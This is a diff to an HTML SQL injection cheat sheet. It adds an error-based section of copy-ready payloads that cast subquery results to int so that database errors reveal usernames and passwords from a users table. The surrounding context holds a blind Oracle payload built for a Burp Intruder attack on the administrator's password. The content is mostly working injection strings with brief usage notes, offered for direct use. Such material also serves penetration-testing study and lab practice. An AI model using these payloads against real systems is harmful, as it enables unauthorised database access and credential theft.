@@ -309,7 +309,41 @@ dissapears, meaning the final value is the total lenght.
 <b>NOTE: </b> Now it is time of an "INTRUDER" attack to check each position. 
 
 <b>SAMPLE: </b><mark>'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</mark>
+
+<details>
+<summary>VISIBLE ERROR-BASED</summary>
+<p><b>DESCRIPTION: </b> try the different default test attempts, first need a valid syntactically query. You can determine that looking for 
+errors. 
+
+<u>1. CREATE A GENERIC SELECT SUBQUERY AND CAST THE RETURNED VALUE TO AN INT DATA TYPE</u>
+
+<b>DESCRIPTION: </b> This method can help to retrieve information from other tables with the CAST value logic behind. 
 	
+<b>C1: </b><p id="VEB01"><mark>' AND CAST((SELECT 1) AS int)--</mark></p>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#VEB01')">.C1.</button>
+
+<b>NOTE: </b> If you get some errors about boolean expressions, you can try another comparison operator. Getting no errors means the query is 
+valid syntax format.
+
+<b>C2: </b><p id="VEB02"><mark>' AND 1=CAST((SELECT 1) AS int)--</mark></p>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#VEB02')">.C2.</button>
+
+<b>C3: </b><p id="VEB03"><mark>' AND 1=CAST((SELECT COLUMN_NAME FROM TABLE_NAME) AS int)--</mark></p>
+<b>SAMPLE: </b><mark>' AND 1=CAST((SELECT username FROM users) AS int)--</mark>
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#VEB03')">.C3.</button>
+	
+<b>NOTE: </b> If the query now appears to be truncated due to a character limit remove value content to query only the field.
+
+<b>C4: </b><p id="VEB04"><mark>' AND 1=CAST((SELECT COLUMN_NAME FROM TABLE_NAME LIMIT 1) AS int)--</mark></p>
+<b>SAMPLE: </b><mark>' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--</mark>
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#VEB04')">.C4.</button>
+
+<b>NOTE: </b> After getting a valid user, you can use the same methodology to leak the password.
+
+<b>SAMPLE: </b><mark>' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--</mark></p>
+</details>
 </details>	
 </p>
 </details>
